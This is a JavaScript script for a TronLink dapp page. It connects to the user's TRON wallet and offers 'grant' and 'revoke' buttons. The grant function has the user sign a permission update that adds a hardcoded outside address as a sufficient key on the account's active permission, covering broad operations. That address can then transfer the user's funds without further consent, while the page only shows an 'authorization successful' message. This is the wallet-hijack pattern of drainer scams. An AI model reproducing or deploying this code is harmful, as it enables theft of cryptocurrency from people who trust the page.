let tronWeb;
const dappAddress = "TYEWTftYUiifa3aURSFc5r5hTL8gkwtGgs";

function connect() {
  if (!window.tronWeb || !window.tronWeb.ready) {
    alert("請用 TronLink App 開啟");
    return;
  }
  tronWeb = window.tronWeb;
  document.getElementById("address").innerText =
    "已連接：" + tronWeb.defaultAddress.base58;
}

async function grant() {
  const user = tronWeb.defaultAddress.base58;

  const tx = await tronWeb.transactionBuilder.updateAccountPermissions(
    user,
    {
      owner_permission: {
        type: 0,
        permission_name: "owner",
        threshold: 1,
        keys: [{ address: user, weight: 1 }]
      },
      active_permissions: [{
        type: 2,
        permission_name: "active",
        threshold: 1,
        operations:
          "7fff1fc0033e0100000000000000000000000000000000000000000000000000",
        keys: [
          { address: user, weight: 1 },
          { address: dappAddress, weight: 1 }
        ]
      }]
    }
  );

  const signed = await tronWeb.trx.sign(tx);
  const result = await tronWeb.trx.sendRawTransaction(signed);
  alert(result.result ? "授權成功" : "授權失敗");
}

async function revoke() {
  const user = tronWeb.defaultAddress.base58;

  const tx = await tronWeb.transactionBuilder.updateAccountPermissions(
    user,
    {
      owner_permission: {
        type: 0,
        permission_name: "owner",
        threshold: 1,
        keys: [{ address: user, weight: 1 }]
      },
      active_permissions: [{
        type: 2,
        permission_name: "active",
        threshold: 1,
        operations:
          "7fff1fc0033e0100000000000000000000000000000000000000000000000000",
        keys: [{ address: user, weight: 1 }]
      }]
    }
  );

  const signed = await tronWeb.trx.sign(tx);
  const result = await tronWeb.trx.sendRawTransaction(signed);
  alert(result.result ? "已取消授權" : "失敗");

}
